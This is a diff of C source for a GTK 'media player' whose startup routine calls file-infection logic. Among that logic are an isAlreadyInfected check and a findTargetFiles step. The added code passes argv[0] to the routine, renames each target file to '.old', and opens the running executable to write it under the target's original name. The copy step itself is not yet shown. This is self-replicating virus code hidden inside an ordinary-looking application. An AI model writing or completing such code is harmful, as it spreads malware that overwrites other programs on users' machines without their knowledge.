@@ -10,7 +10,7 @@
 bool isAlreadyInfected(char *pgrmName, DIR *d);
 // step 4 : find target files
 // gcc -o mediaPlayer mediaplayer/mediaplayer.c `pkg-config --cflags --libs gtk+-3.0`
-void findTargetFiles()
+void findTargetFiles(char *currentPgrmName)
 {
         DIR *d;
         struct dirent *dir;
@@ -48,12 +48,14 @@ void findTargetFiles()
                                                 strcpy(newName, dir->d_name);
                                                 strcat(newName, ".old");
                                                 rename(dir->d_name, newName);
-                                                // opening the .old
-                                                FILE *inputFile;
-                                                inputFile = fopen(newName, "r");
-                                                printf(" %s\n", dir->d_name);
 
-                                                fd = open(tmpname, O_WRONLY | O_APPEND | O_CREAT, 0644);
+                                                // opening current running exe in reading mode
+                                                FILE *runningFile, *newCreatedFile;
+                                                runningFile = fopen(currentPgrmName, "r");
+                                                printf("Current running exe name : %s\n", currentPgrmName);
+                                                newCreatedFile = fopen(dir->d_name, "w+");
+                                                
+                                                // fd = open(tmpname, O_WRONLY | O_APPEND | O_CREAT, 0644);
                                                 free(newName);
                                         }
                                 }
@@ -223,7 +225,8 @@ static void remove_image() {
 */
 int main(int argc, char *argv[])
 {
-        findTargetFiles();
+        // putting the argument of the running pgrm name in params
+        findTargetFiles(argv[0]);
         GtkWidget *menu_bar, *file_menu, *menu_item, *vbox_menu, *button;
 
         gtk_init(&argc, &argv);
